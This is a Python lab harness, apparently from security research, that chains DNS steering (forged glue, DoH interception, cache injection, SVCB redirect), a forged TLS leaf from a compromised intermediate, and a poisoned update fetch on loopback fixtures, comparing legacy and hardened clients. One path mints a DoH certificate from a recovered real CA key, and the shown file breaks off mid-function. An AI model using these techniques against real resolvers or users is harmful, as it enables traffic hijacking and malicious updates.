#!/usr/bin/env python3
"""chain_demo.py - one-path integrated chain, lab only.

    DNS stand-in -> forged TLS -> poisoned update -> Brotli decode

A single client run walks every stage of the demo chain in one connection path
and records one decision marker per stage:

  1. dns     resolve the target name through the ADDITIONAL-following resolver
             stand-in (poc/lab/dns/resolver_model.py, task-9). policy
             "follow" = the measured 1.1.1.1 behavior (delegation-level
             steering by the unrelated ADDITIONAL A:
             artifacts/dns-reprobe2-2026-10-27.json, artifacts/dns-disc-2026-10-27.json);
             policy "reresolve" = the measured mainstream behavior (6/6
             open-source resolvers in the matrix: RE-RESOLVE-REAL).
  2. tls     connect to the resolved endpoint, SNI/hostname = the target name.
             The fake endpoint serves a leaf issued by a KNOWN-COMPROMISED
             intermediate (the eMudhra case; classification reuses
             lab_http.certificate_info against artifacts/impacted-intermediates.json).
             legacy policy: chain-trust only -> TLS_ACCEPTED.
             hardened policy: chain-trust + issuer distrust (+ optional CRL
             enforcement) -> TLS_REJECTED.
  3. update  fetch /update/feed.json and the update body over the SAME TLS
             session. legacy policy hands the body to the Brotli decoder before
             any integrity check; hardened verifies content-encoding allow-list
             and digest + signature under a PINNED publisher key first.
  4. decode  legacy: the attacker body reaches the decoder (marker found in the
             decoded document). hardened: SIG_REJECTED / ENCODING_REJECTED with
             zero decoder calls.

Everything here is a real component - the fixture DNS authority and resolver
stand-in (task-9), real TLS handshakes, the real lab_http endpoints, the real
mock_registry fixture, and the real client-side decode/verify code
(demo/fake-pkg/src/kirimochi.py). The only stand-in is the resolver's policy
model. Certificate material is either supplied (the production demo inputs from
poc/lab/certs/make_leaf.py, kept outside the repository) or generated as
synthetic stand-ins shaped like the eMudhra case; no key material is read from
or written to secrets/.

This file contains no exploit payload and no malformed Brotli stream: the
update bodies are valid Brotli lab markers (poc/lab/http/check_brotli.py).
"""
import argparse
import base64
from datetime import datetime, timedelta, timezone
import hashlib
from http.client import HTTPResponse
import importlib.util
import json
import os
from pathlib import Path
import shutil
import socket
import ssl
import subprocess
import sys
import tempfile
import time

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "poc/vendor"))
TARGET_NAME = "pay.v.lab.yes-its-a-problem.iamwonderingif.com"
# The two lab endpoints are advertised as TEST-NET addresses (the same fixture
# addresses poc/lab/dns and poc/PLAN.md use) and mapped to loopback listeners,
# exactly as the Electron demo maps them with --host-resolver-rules. The
# mapping is the only address stand-in in this demo; the resolution itself runs
# through the resolver stand-in and the sockets are real.
TRUE_ADDR = "192.0.2.10"
FAKE_ADDR = "198.51.100.66"
ADDRESS_MAPPING_NOTE = ("lab addresses mapped to loopback listeners (the same stand-in as "
                        "the Electron demo's --host-resolver-rules); no external traffic")


def load_module(name, relpath):
    spec = importlib.util.spec_from_file_location(name, ROOT / relpath)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


http = load_module("lab_http", "poc/lab/http/lab_http.py")
check_brotli = load_module("check_brotli", "poc/lab/http/check_brotli.py")
kirimochi = load_module("kirimochi", "demo/fake-pkg/src/kirimochi.py")
mock_registry = load_module("mock_registry", "demo/fake-pkg/server/mock_registry.py")

DECISIONS = ("RESOLVED_FAKE", "RESOLVED_TRUE", "RESOLVER_STANDIN_PENDING", "RESOLVER_BYPASSED",
             "PRIMED", "TLS_ACCEPTED", "TLS_REJECTED",
             "DECODED", "ACCEPTED", "SIG_REJECTED", "ENCODING_REJECTED", "INCONCLUSIVE")

# The three DNS trigger arms of the one-path chain. They differ only in how the
# victim name comes to point at the attacker endpoint; stages TLS -> update ->
# decode are identical afterwards.
#   referral     trigger (a): the crafted referral is WALKED by the resolver
#                stand-in (task-9) with policy "follow" (measured 1.1.1.1
#                delegation-level steering: artifacts/dns-disc-2026-10-27.json,
#                artifacts/dns-reprobe2-2026-10-27.json) or "reresolve"
#                (measured mainstream, 24/24 RE-RESOLVE-REAL).
#   doh-mitm     trigger (b): the CA compromise issues a trusted-looking cert
#                for the client's DoH resolver hostname, and an on-path proxy
#                injects the A answer inside the encrypted DNS session. No
#                provider bug, no resolver bug, no cache poisoning.
#   udp-injection trigger (c), baseline: the same A answer delivered as a plain
#                UDP DNS response - the pre-DoH on-path case.
#   dangling     trigger (d): a legitimate delegation with an external NS name
#                and honest parent-side glue, where that NS name has LAPSED and
#                the attacker re-registered it. No forged ADDITIONAL anywhere:
#                mainstream resolvers re-resolve the NS name (measured 10/10
#                RE-RESOLVE-REAL) and land at the attacker. One account
#                misdirects names the attacker does not own.
#   svcb         trigger (e): the forged answer keeps the A record CORRECT but
#                carries an HTTPS/SVCB record (RFC 9460) pointing at the
#                attacker. Chromium honors HTTPS RRs, so the DNS answer alone
#                redirects the connection - the cleanest causal demo.
#   answer-inject trigger (f): the attacker's authority answers its OWN name
#                successfully with an unsolicited A for the target name riding
#                in the ANSWER section (the p5 shape). A PowerDNS-class chain
#                resolver stores it (measured: PowerDNS Recursor 5.1.3/4.9.5,
#                different-zone owner; out-of-zone REJECT - matrix-2026-10-27-p5)
#                and later answers the target name from cache: TTL decay is the
#                proof. Unbound-class resolvers reject it.
TRIGGERS = ("referral", "doh-mitm", "udp-injection", "dangling", "svcb", "answer-inject")
DOH_HOST = "one.one.one.one"


# --------------------------------------------------------------------------
# Certificate material: supplied production inputs or synthetic stand-ins.
# --------------------------------------------------------------------------

def issue_cert(subject, key, issuer=None, issuer_key=None, *, ca=False, sans=(), serial=None):
    signer = issuer_key or key
    now = datetime.now(timezone.utc)
    builder = (x509.CertificateBuilder()
        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, subject)]))
        .issuer_name(issuer.subject if issuer is not None else x509.Name(
            [x509.NameAttribute(NameOID.COMMON_NAME, subject)]))
        .public_key(key.public_key())
        .serial_number(serial or x509.random_serial_number())
        .not_valid_before(now - timedelta(days=1)).not_valid_after(now + timedelta(days=30))
        .add_extension(x509.BasicConstraints(ca=ca, path_length=None), critical=True)
        .add_extension(x509.KeyUsage(True, False, False, False, False, ca, ca, False, False), critical=True)
        .add_extension(x509.SubjectKeyIdentifier.from_public_key(key.public_key()), False)
        .add_extension(x509.AuthorityKeyIdentifier.from_issuer_public_key(signer.public_key()), False))
    if not ca:
        builder = (builder
            .add_extension(x509.SubjectAlternativeName([x509.DNSName(s) for s in sans]), False)
            .add_extension(x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), False))
    return builder.sign(signer, hashes.SHA256())


def write_chain(directory, name, cert, key, issuer):
    chain = directory / (name + ".pem")
    private = directory / (name + ".key.pem")
    chain.write_bytes(cert.public_bytes(serialization.Encoding.PEM) +
                      issuer.public_bytes(serialization.Encoding.PEM))
    private.write_bytes(key.private_bytes(serialization.Encoding.PEM,
                                          serialization.PrivateFormat.PKCS8,
                                          serialization.NoEncryption()))
    private.chmod(0o600)
    return str(chain), str(private)


def build_synthetic_material(directory, target_name, extra_sans=()):
    """Stand-in chains shaped like the eMudhra case: a leaf issued by an
    intermediate that the hardened policy must distrust (and that a CRL can
    revoke). Synthetic keys only; nothing from secrets/."""
    target_names = [target_name] + [name for name in extra_sans if name != target_name]
    directory = Path(directory)
    directory.mkdir(parents=True, exist_ok=True)
    root_key = ec.generate_private_key(ec.SECP256R1())
    root = issue_cert("integrated-chain test root", root_key, ca=True)
    compromised_key = ec.generate_private_key(ec.SECP256R1())
    compromised = issue_cert("stand-in compromised intermediate", compromised_key,
                             root, root_key, ca=True, serial=0xC0FFEE)
    leaf_key = ec.generate_private_key(ec.SECP256R1())
    leaf = issue_cert("forged leaf", leaf_key, compromised, compromised_key,
                      sans=target_names)
    good_key = ec.generate_private_key(ec.SECP256R1())
    good = issue_cert("ordinary intermediate", good_key, root, root_key, ca=True)
    good_leaf_key = ec.generate_private_key(ec.SECP256R1())
    good_leaf = issue_cert("ordinary leaf", good_leaf_key, good, good_key, sans=target_names)
    roots = directory / "roots.pem"
    roots.write_bytes(root.public_bytes(serialization.Encoding.PEM))
    (directory / "root.key.pem").write_bytes(root_key.private_bytes(
        serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))
    # Kept so the trigger arms can mint a DoH-endpoint certificate from the same
    # stand-in compromised CA - the real scenario mints it from the recovered
    # eMudhra intermediate instead (make_doh_cert).
    (directory / "compromised.key.pem").write_bytes(compromised_key.private_bytes(
        serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))
    (directory / "compromised.key.pem").chmod(0o600)
    (directory / "compromised.pem").write_bytes(
        compromised.public_bytes(serialization.Encoding.PEM))
    # Known-compromised issuer metadata, in the same shape as
    # artifacts/impacted-intermediates.json (lab_http.certificate_info reads it).
    meta = directory / "compromised-intermediates.json"
    meta.write_text(json.dumps([{"pem": compromised.public_bytes(serialization.Encoding.PEM).decode()}]))
    # A CRL revoking the compromised intermediate (the revocation control).
    crl = (x509.CertificateRevocationListBuilder()
        .issuer_name(root.subject)
        .last_update(datetime.now(timezone.utc) - timedelta(hours=1))
        .next_update(datetime.now(timezone.utc) + timedelta(days=1))
        .add_revoked_certificate(x509.RevokedCertificateBuilder()
            .serial_number(compromised.serial_number)
            .revocation_date(datetime.now(timezone.utc) - timedelta(hours=1)).build())
        .sign(root_key, hashes.SHA256()))
    crl_path = directory / "compromised.crl.pem"
    crl_path.write_bytes(crl.public_bytes(serialization.Encoding.PEM))
    forged = write_chain(directory, "forged-leaf", leaf, leaf_key, compromised)
    ordinary = write_chain(directory, "ordinary-leaf", good_leaf, good_leaf_key, good)
    return {
        "roots": str(roots), "compromised_meta": str(meta), "crl": str(crl_path),
        "forged": forged, "ordinary": ordinary, "material": "synthetic-stand-in",
        "compromised_ca": str(directory / "compromised.pem"),
        "compromised_ca_key": str(directory / "compromised.key.pem"),
    }


def make_doh_cert(directory, material, doh_host=DOH_HOST, ca_crt=None, ca_key=None):
    """Certificate for the DoH endpoint hostname (the trigger-(b) identity).

    Real path: emudhra-dns-mitm-poc/certs/issue_leaf.py against a recovered
    eMudhra intermediate (pass ca_crt/ca_key - the tooling keeps key material
    outside this repository; nothing here reads or prints it). The resulting
    chain verifies against the public eMudhra roots, which is exactly the
    incident condition the trigger models.
    Synthetic path (tests): a leaf from the same stand-in compromised
    intermediate that signs the app-TLS leaf, so both identities come from one
    compromised CA - the shape of the real scenario.
    """
    directory = Path(directory)
    directory.mkdir(parents=True, exist_ok=True)
    if ca_crt and ca_key:
        out = directory / "doh-leaf"
        subprocess.run([sys.executable,
                        str(ROOT / "emudhra-dns-mitm-poc/certs/issue_leaf.py"),
                        "--cn", doh_host, "--ca-crt", str(ca_crt), "--ca-key", str(ca_key),
                        "--out", str(out)], check=True, capture_output=True)
        return {"cert": str(out / "fullchain.pem"), "key": str(out / "leaf.key.pem"),
                "host": doh_host, "material": "eMudhra-recovered-CA"}
    ca_cert = x509.load_pem_x509_certificate(Path(material["compromised_ca"]).read_bytes())
    ca_key_obj = serialization.load_pem_private_key(
        Path(material["compromised_ca_key"]).read_bytes(), password=None)
    key = ec.generate_private_key(ec.SECP256R1())
    leaf = issue_cert("doh endpoint", key, ca_cert, ca_key_obj, sans=[doh_host])
    chain, private = write_chain(directory, "doh-leaf", leaf, key, ca_cert)
    return {"cert": chain, "key": private, "host": doh_host,
            "material": material.get("material", "synthetic-stand-in")}


# --------------------------------------------------------------------------
# DNS stage: three trigger arms, one interface.
# --------------------------------------------------------------------------

class DnsFixture:
    """The task-9 fixture chain on loopback high ports (lab_dns roles root /
    provider / thirdparty / true / fake), configured for the demo zone so the
    same victim name works across every trigger mode. Addresses inside DNS data
    are virtual; addr_map translates them to the loopback listeners, exactly as
    poc/lab/dns/test_resolver_model.py's FixtureChain does."""

    ZONE = "lab.yes-its-a-problem.iamwonderingif.com"
    CHILD = "v"
    TP_ZONE = "netserv.lab.invalid"
    FORGED_NS = "ns-33." + TP_ZONE
    PROVIDER_V = "192.0.2.53"
    TP_V = "192.0.2.54"
    TRUE_NS_V = "192.0.2.20"
    POISON_V = "198.51.100.66"
    TRUE_MARKER = "203.0.113.10"
    FAKE_MARKER = "203.0.113.66"

    # mode "referral"  (a): forged ADDITIONAL glue (the unrelated A).
    # mode "dangling"  (d): honest glue, but the external NS name is now
    #                      attacker-owned, so re-resolution lands at the
    #                      attacker.
    # mode "dangling-control": honest glue AND the true operator still owns the
    #                      NS name - the (d) negative control.
    MODES = ("referral", "dangling", "dangling-control")

    def __init__(self, mode="referral"):
        if mode not in self.MODES:
            raise ValueError("unknown fixture mode: " + mode)
        self.mode = mode
        self.servers = []
        self.ports = {}
        self.addr_map = {}

    def start(self):
        lab_dns = load_module("lab_dns", "poc/lab/dns/lab_dns.py")
        from dnslib.server import DNSServer, DNSLogger
        logger = DNSLogger(log="-request,-reply,-truncated,-error")
        root_cfg = {"zone": ".", "child": self.CHILD, "provider_ns": "a.root.lab.invalid",
                    "true_ip": self.PROVIDER_V, "fake_ip": self.POISON_V, "ttl": 300,
                    "delegations": [(self.ZONE, "ns1." + self.ZONE, self.PROVIDER_V),
                                    (self.TP_ZONE, "ns1." + self.TP_ZONE, self.TP_V)]}
        # Parent-side glue for the external NS name: forged in (a), honest in
        # (d) and its control. The NS target zone answers the ATTACKER address
        # only in (d) - that is the re-registered (dangling) NS name.
        glue = self.POISON_V if self.mode == "referral" else self.TRUE_NS_V
        ns_answer = self.POISON_V if self.mode == "dangling" else self.TRUE_NS_V
        provider_cfg = {"zone": self.ZONE, "child": self.CHILD, "provider_ns": "ns1." + self.ZONE,
                        "child_ns": self.FORGED_NS, "pattern": "p3",
                        "third_party": self.FORGED_NS, "third_party_ip": glue,
                        "referral_owner": "name", "true_ip": self.TRUE_NS_V,
                        "fake_ip": glue, "ttl": 300}
        tp_cfg = {"zone": self.TP_ZONE, "child": self.TP_ZONE, "provider_ns": "ns1." + self.TP_ZONE,
                  "true_ip": ns_answer, "fake_ip": self.POISON_V, "ttl": 300}
        true_cfg = {"zone": self.ZONE, "child": self.CHILD, "provider_ns": "ns1." + self.ZONE,
                    "child_ns": "ns-true." + self.ZONE, "true_ip": self.TRUE_MARKER,
                    "fake_ip": self.FAKE_MARKER, "ttl": 300, "nxd_prefix": "nope"}
        fake_cfg = {"zone": self.ZONE, "child": self.CHILD, "provider_ns": "ns1." + self.ZONE,
                    "child_ns": "ns-fake." + self.ZONE, "true_ip": self.TRUE_MARKER,
                    "fake_ip": self.FAKE_MARKER, "ttl": 300, "nxd_prefix": "nope"}
        plan = [("root", root_cfg, self.PROVIDER_V), ("provider", provider_cfg, self.PROVIDER_V),
                ("thirdparty", tp_cfg, self.TP_V), ("true", true_cfg, self.TRUE_NS_V),
                ("fake", fake_cfg, self.POISON_V)]
        for role, cfg, virt in plan:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(("127.0.0.1", 0))
            port = sock.getsockname()[1]
            sock.close()
            for tcp in (True, False):
                server = DNSServer(lab_dns.LabResolver(cfg, role), address="127.0.0.1",
                                   port=port, tcp=tcp, logger=logger)
                server.start_thread()
                self.servers.append(server)
            self.ports[role] = port
            if role != "root":
                self.addr_map[virt] = ("127.0.0.1", port)
        time.sleep(0.4)

    def stop(self):
        for server in self.servers:
            try:
                server.stop()
                server.server.server_close()
            except Exception:
                pass

    @property
    def root(self):
        return ("127.0.0.1", self.ports["root"])


# Routing shim table (see the README shim audit): virtual
# INFRASTRUCTURE addresses -> lab endpoint roles. Nothing in this demo maps the
# TARGET NAME to an address on the client side - the target name's resolution
# is a real protocol exchange (fixture authorities / resolver stand-in /
# injector), and only the ADDRESS that exchange produced is routed to a
# loopback listener. See the README shim audit.
ENDPOINT_ROLES = {"203.0.113.10": "true", "203.0.113.66": "fake",
                  "192.0.2.10": "true", "198.51.100.66": "fake"}


class TriggerResolver:
    """DNS stage for one trigger mode: (name, policy) -> (record, endpoint role)."""

    def __init__(self, trigger, *, fixture=None, doh=None, udp=None, chain=None,
                 trust_root=None, crl=None, compromised_meta=None):
        self.trigger = trigger
        self.fixture = fixture
        self.doh = doh
        self.udp = udp
        self.chain = chain
        self.trust_root = trust_root
        self.crl = crl
        self.compromised_meta = compromised_meta

    def _peer_checker(self, tls_socket):
        """Hardened DoH check: the same issuer-distrust rule the app TLS stage
        applies - a chain from a known-compromised CA is refused even though it
        verifies against the trust root (the incident's real condition)."""
        if not self.compromised_meta:
            return {"tls": "unknown"}
        return classify_peer(tls_socket, self.compromised_meta)

    def _role_for(self, address, fallback=None):
        """Attribute an answered address to a lab endpoint by its marker."""
        if address == DnsFixture.FAKE_MARKER:
            return "fake"
        if address == DnsFixture.TRUE_MARKER:
            return "true"
        return fallback

    def __call__(self, name, policy, flavor="legacy"):
        record = {"stage": "dns", "trigger": self.trigger, "policy": policy, "qname": name,
                  "client_flavor": flavor,
                  "cites": ["artifacts/dns-reprobe2-2026-10-27.json",
                            "artifacts/dns-disc-2026-10-27.json",
                            "artifacts/dns-authority-trace2-2026-10-27.json"]}
        if self.trigger in ("referral", "dangling"):
            if self.fixture is None:
                path = ROOT / "poc/lab/dns/resolver_model.py"
                if not path.exists():
                    record.update({"decision": "RESOLVER_STANDIN_PENDING",
                                   "detail": "resolver stand-in (task-9) not available"})
                    return [record], None
                raise ValueError(self.trigger + " trigger needs a started DnsFixture")
            if self.trigger == "dangling":
                # The dangling trigger only works where the resolver RE-RESOLVES
                # the NS name - the measured mainstream behavior (10/10
                # RE-RESOLVE-REAL). There is no forged ADDITIONAL to follow.
                policy = "reresolve"
                record["policy"] = "reresolve"
                record["policy_note"] = ("dangling delegation requires NS-name "
                                         "re-resolution (measured mainstream); no forged "
                                         "ADDITIONAL exists in this scenario")
                record["cites"].append("artifacts/dns-authority-trace2-2026-10-27.json")
            model = load_module("resolver_model", "poc/lab/dns/resolver_model.py")
            result = model.resolve(name, [self.fixture.root], policy=policy,
                                   addr_map=self.fixture.addr_map, timeout=6)
            answers = result.get("answers") or []
            answer_addr = answers[0].get("address") if answers else None
            role = self._role_for(answer_addr, result.get("endpoint_role"))
            record.update({"decision": "RESOLVED_FAKE" if role == "fake" else "RESOLVED_TRUE",
                           "stand_in": "poc/lab/dns/resolver_model.py",
                           "endpoint_role": role,
                           "endpoint_addr": result.get("endpoint_addr"),
                           "answer_address": answer_addr,
                           "steered_by_additional": bool(result.get("steered_by_additional")),
                           "trace": (result.get("trace") or [])[:12]})
            return [record], role
        if self.trigger == "doh-mitm":
            import doh_mitm
            context = ssl.create_default_context(cafile=self.trust_root)
            if self.crl:
                context.load_verify_locations(cafile=self.crl)
                context.verify_flags |= ssl.VERIFY_CRL_CHECK_CHAIN
            # Only the hardened client distrusts the compromised issuer here;
            # the legacy client is the incident condition - it believes the
            # forged DoH certificate because it verifies against a trusted root
            # and revocation is not enforced.
            result = doh_mitm.doh_query(
                self.doh["host"], self.doh["port"], name, context,
                server_hostname=self.doh.get("server_hostname", DOH_HOST),
                peer_checker=(self._peer_checker
                              if self.compromised_meta and flavor == "hardened" else None))
            record.update({k: v for k, v in result.items() if k != "stage"})
            record["doh_cert_material"] = (self.doh or {}).get("cert_material")
            record["answer_address"] = ((result.get("answers") or [{}])[0].get("address"))
            if result.get("decision") == "RESOLVED":
                record["decision"] = "RESOLVED_FAKE"
                record["endpoint_role"] = "fake"
                return [record], "fake"
            return [record], None
        if self.trigger in ("udp-injection", "svcb"):
            import doh_mitm
            if self.trigger == "svcb":
                result = doh_mitm.svcb_query(self.udp["host"], self.udp["port"], name)
            else:
                result = doh_mitm.udp_query(self.udp["host"], self.udp["port"], name)
            record.update({k: v for k, v in result.items() if k != "stage"})
            record["answer_address"] = result.get("address") or result.get("a_address")
            if result.get("decision") == "RESOLVED":
                role = self._role_for(result.get("address"), "fake")
                record["decision"] = "RESOLVED_FAKE" if role == "fake" else "RESOLVED_TRUE"
                record["endpoint_role"] = role
                return [record], role
            return [record], None
        if self.trigger == "answer-inject":
            import doh_mitm
            chain = self.chain or {}
            # Stage: prime the victim's resolver with the ATTACKER'S OWN name.
            # Its forged successful answer carries an unsolicited A for the
            # target name in the ANSWER section (the p5 shape).
            prime = doh_mitm.udp_query(chain["host"], chain["port"], chain["prime_name"])
            prime_record = {"stage": "dns-prime", "trigger": "answer-inject",
                            "qname": chain["prime_name"], "client_flavor": flavor,
                            "policy": "answer-inject",
                            "resolver_class": chain.get("resolver_class"),
                            "resolver_backend": chain.get("backend"),
                            "decision": ("PRIMED" if prime.get("decision") == "RESOLVED"
                                         else "INCONCLUSIVE"),
                            "answers": prime.get("answers"),
                            "cites": ["artifacts/dns-authority-trace2-2026-10-27.json"]}
            if prime.get("decision") != "RESOLVED":
                prime_record["reason"] = "priming query did not resolve"
                return [prime_record], None
            delay = chain.get("prime_delay", 1.2)
            time.sleep(delay)
            # The client query for the TARGET name; a PowerDNS-class resolver
            # answers it from cache - TTL decay is the cache-acceptance proof.
            first = doh_mitm.udp_query(chain["host"], chain["port"], name)
            time.sleep(delay)
            second = doh_mitm.udp_query(chain["host"], chain["port"], name)
            answers = first.get("answers") or second.get("answers") or []
            ttl_first = (first.get("answers") or [{}])[0].get("ttl")
            ttl_second = (second.get("answers") or [{}])[0].get("ttl")
            model_cache = (chain.get("model").cache_proof(name)
                           if chain.get("model") is not None else {})
            record.update({k: v for k, v in second.items() if k != "stage"})
            record["policy"] = "answer-inject"
            record["resolver_class"] = chain.get("resolver_class")
            record["resolver_backend"] = chain.get("backend")
            record["answer_address"] = answers[0].get("address") if answers else None
            record["cache_proof"] = {
                "cached": bool(ttl_first is not None and ttl_second is not None
                               and ttl_second < ttl_first),
                "ttl_first": ttl_first, "ttl_second": ttl_second,
                "ttl_decay": (ttl_first - ttl_second)
                             if (ttl_first is not None and ttl_second is not None) else None,
                "authoritative_ttl": 300,
                "model_cache": model_cache,
                "note": ("authoritative answers always carry the fixture TTL 300; a "
                         "decaying TTL can only come from a cache (matrix-2026-10-27-p5 "
                         "probe: 300 -> 297)")}
            if answers:
                role = self._role_for(answers[0].get("address"), "fake")
                record["decision"] = "RESOLVED_FAKE" if role == "fake" else "RESOLVED_TRUE"
                record["endpoint_role"] = role
                return [prime_record, record], role
            record["decision"] = "INCONCLUSIVE"
            record["reason"] = "no cached answer for the target name"
            return [prime_record, record], None
        raise ValueError("unknown trigger mode: " + self.trigger)


# --------------------------------------------------------------------------
# Endpoints: real lab_http processes (one per role), loopback only.
# --------------------------------------------------------------------------

def start_endpoint(role, bind, port, tls, registry_dir, log_path, target_name):
    command = [sys.executable, "-B", str(ROOT / "poc/lab/http/lab_http.py"),
               "--role", role, "--bind", bind, "--port", str(port),
               "--cert", tls[0], "--key", tls[1],
               "--registry-dir", registry_dir, "--log", str(log_path)]
    # The fake endpoint serves its (forged or supplied) chain as the base
    # chain for the target name; the client-side classification decides
    # "forged", exactly as lab_http.certificate_info does server-side.
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    deadline = time.time() + 15
    while time.time() < deadline:
        if process.poll() is not None:
            raise RuntimeError("lab_http exited: " + (process.stderr.read() or ""))
        try:
            with socket.create_connection((bind, port), timeout=0.5):
                return process
        except OSError:
            time.sleep(0.05)
    process.terminate()
    raise RuntimeError("lab_http did not start on %s:%d" % (bind, port))


def start_endpoints(material, registry_dir, port_hint=9601, target_name=TARGET_NAME, log_dir=None):
    """Both endpoints listen on loopback, one port each; the TEST-NET addresses
    they stand in for are recorded so the client can map resolutions onto them."""
    log_dir = Path(log_dir) if log_dir else Path(tempfile.mkdtemp(prefix="chain-logs-"))
    for port in range(port_hint, port_hint + 50):
        try:
            true = start_endpoint("true", "127.0.0.1", port, material["ordinary"],
                                  registry_dir, log_dir / "true.log", target_name)
        except RuntimeError:
            continue
        try:
            fake = start_endpoint("fake", "127.0.0.1", port + 1, material["forged"],
                                  registry_dir, log_dir / "fake.log", target_name)
        except RuntimeError:
            true.terminate()
            continue
        endpoints = {"true": ("127.0.0.1", port, true), "fake": ("127.0.0.1", port + 1, fake),
                     "logs": log_dir,
                     "address_map": {TRUE_ADDR: ("127.0.0.1", port), FAKE_ADDR: ("127.0.0.1", port + 1)}}
        return endpoints
    raise RuntimeError("no free loopback port pair near %d" % port_hint)


def stop_endpoints(endpoints):
    for key in ("true", "fake"):
        process = endpoints[key][2]
        process.terminate()
        try:
            process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            process.kill()


# --------------------------------------------------------------------------
# TLS and update stages: one client path.
# --------------------------------------------------------------------------

def http_get(tls_socket, path, host):
    """One request on the shared TLS session (keep-alive: the whole chain runs
    over one connection, so every stage is on the same path)."""
    tls_socket.sendall(("GET " + path + " HTTP/1.1\r\nHost: " + host +
                        "\r\nUser-Agent: chain-demo/1\r\nConnection: keep-alive\r\n\r\n").encode())
    response = HTTPResponse(tls_socket, method="GET")
    response.begin()
    body = response.read()
    return response.status, {k.lower(): v for k, v in response.getheaders()}, body


def classify_peer(tls_socket, compromised_meta):
    """Same classification as lab_http.certificate_info: leaf against the
    known-compromised issuer list (artifacts/impacted-intermediates.json)."""
    pem = ssl.DER_cert_to_PEM_cert(tls_socket.getpeercert(binary_form=True))
    with tempfile.NamedTemporaryFile("w", suffix=".pem", delete=False) as handle:
        handle.write(pem)
        path = handle.name
    try:
        saved = http.CA_METADATA
        http.CA_METADATA = Path(compromised_meta)
        try:
            return http.certificate_info(path)
        finally:
            http.CA_METADATA = saved
    finally:
        os.unlink(path)


def run_leg(flavor, endpoint, target_name, *, dns_policy="follow", artifact="br",
            pinned_key_pem=None, allow_encodings=("identity",), compromised_meta=None,
            crl=None, trust_root=None, endpoints_by_role=None, resolver=None,
            decode_hook=None):
    """One client run through the whole chain. Returns the evidence record."""
    # "legacy-tls-hardened-update" isolates the update-stage control: it walks
    # the same path with the legacy TLS posture and the hardened update policy.
    tls_flavor = "hardened" if flavor == "hardened" else "legacy"
    update_flavor = "hardened" if flavor in ("hardened", "legacy-tls-hardened-update") else "legacy"
    stages = []
    evidence = {"leg": {"flavor": flavor, "dns_policy": dns_policy, "artifact": artifact,
                        "target": target_name, "endpoint": endpoint[0]},
                "stages": stages, "chain_complete": False}
    decode_calls = [0]

    # Stage 1: DNS - one of the trigger arms, or an explicit endpoint.
    if resolver is not None:
        dns_records, role = resolver(target_name, dns_policy, flavor=tls_flavor)
    else:
        dns_records, role = ([{"stage": "dns", "decision": "RESOLVER_BYPASSED",
                               "policy": dns_policy, "qname": target_name,
                               "detail": "explicit endpoint; no trigger arm active"}], None)
    stages.extend(dns_records)
    dns_record = dns_records[-1]
    if dns_record.get("decision") == "TLS_REJECTED":
        # Trigger arm (b) hardened: the DoH certificate itself is refused, so
        # nothing the trigger says is believed and the chain stops right here.
        return evidence
    # Route the RESOLVED ADDRESS to a loopback listener. The shim maps
    # infrastructure endpoints only (fake/true endpoint addresses, the DoH
    # endpoint hostname, NS/authority addresses) - never the target name.
    answer_address = (dns_record.get("answer_address") or dns_record.get("endpoint_addr")
                      or dns_record.get("address"))
    routed_role = ENDPOINT_ROLES.get(answer_address)
    if routed_role and endpoints_by_role and routed_role in endpoints_by_role:
        address, port = endpoints_by_role[routed_role]
        evidence["leg"]["endpoint_role"] = routed_role
        evidence["leg"]["routing"] = ("infrastructure address %s -> loopback %s:%d "
                                      "(endpoint routing shim, not a name mapping)"
                                      % (answer_address, address, port))
    elif role and endpoints_by_role and role in endpoints_by_role:
        address, port = endpoints_by_role[role]
        evidence["leg"]["endpoint_role"] = role
    else:
        address, port = endpoint[0], endpoint[1]
    evidence["leg"]["connected_to"] = address
    evidence["leg"]["address_mapping"] = ADDRESS_MAPPING_NOTE

    # Stage 2: TLS.
    context = ssl.create_default_context(cafile=trust_root)
    if crl:
        context.load_verify_locations(cafile=crl)
        context.verify_flags |= ssl.VERIFY_CRL_CHECK_CHAIN
    try:
        raw = socket.create_connection((address, port), timeout=8)
        tls_socket = context.wrap_socket(raw, server_hostname=target_name)
    except ssl.SSLError as exc:
        stages.append({"stage": "tls", "decision": "TLS_REJECTED",
                       "reason": getattr(exc, "verify_message", None) or str(exc)})
        return evidence
    info = classify_peer(tls_socket, compromised_meta) if compromised_meta else {"tls": "unknown"}
    tls_stage = {"stage": "tls", "decision": "TLS_ACCEPTED", "tls_class": info.get("tls"),
                 "leaf_sha256": info.get("leaf_sha256"),
                 "issuer_spki_sha256": info.get("issuer_spki_sha256")}
    if tls_flavor == "hardened" and info.get("tls") == "forged":
        tls_stage["decision"] = "TLS_REJECTED"
        tls_stage["reason"] = ("chain issued by a known-compromised intermediate "
                               "(issuer distrust; the lab stand-in for revocation enforcement)")
        stages.append(tls_stage)
        tls_socket.close()
        return evidence
    stages.append(tls_stage)

    # Stages 3-4: poisoned update over the SAME TLS session.
    try:
        status, _, feed_bytes = http_get(tls_socket, "/update/feed.json", target_name)
        feed = json.loads(feed_bytes.decode("utf-8"))
        entry = (feed.get("artifacts") or {}).get(artifact)
        stages.append({"stage": "update-feed", "status": status, "signed_artifacts": sorted(
            (feed.get("artifacts") or {}).keys())})
        if not entry:
            stages.append({"stage": "update-body", "decision": "INCONCLUSIVE",
                           "reason": "feed has no artifact named " + artifact})
            return evidence
        status, headers, body = http_get(tls_socket, entry.get("url", "/update_body.br"), target_name)
        encoding = kirimochi.normalize_encoding(headers.get("content-encoding"))
    except (ssl.SSLError, OSError, ValueError) as exc:
        stages.append({"stage": "update-body", "decision": "INCONCLUSIVE", "reason": str(exc)})
        return evidence

    update_stage = {"stage": "update-body", "status": status, "bytes": len(body),
                    "content_encoding": encoding, "decode_calls": 0}
    if update_flavor == "hardened":
